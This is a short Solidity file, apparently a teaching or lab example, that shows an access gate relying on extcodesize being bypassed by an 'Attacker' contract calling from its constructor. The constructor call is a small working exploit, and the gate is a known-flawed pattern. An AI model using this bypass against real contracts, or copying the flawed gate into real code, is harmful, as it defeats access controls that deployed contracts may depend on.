// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAddRecorder {
    
    function callme() external;
}

contract AddrRecorder is IAddRecorder{

    event Addr(address indexed sender, address indexed origin);
    event CallRCDESZ(address indexed sender, uint256 sz);

    modifier gate1 {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gate2 {
        uint256 callerCodeSize;

        assembly {
            callerCodeSize := extcodesize(caller())
        }
        require(callerCodeSize == 0);
        emit CallRCDESZ(msg.sender, callerCodeSize);
        _;
    }

    function callme() public gate1 gate2 {
        emit Addr(msg.sender, tx.origin);
    }
}

contract Attacker {

    constructor (address _victimAddr){
        IAddRecorder addRecorder = IAddRecorder(_victimAddr);
        addRecorder.callme();
        // since it is called through the constructor msg.sender will be Attacker-Contract and tx.origin will be USER
    }
}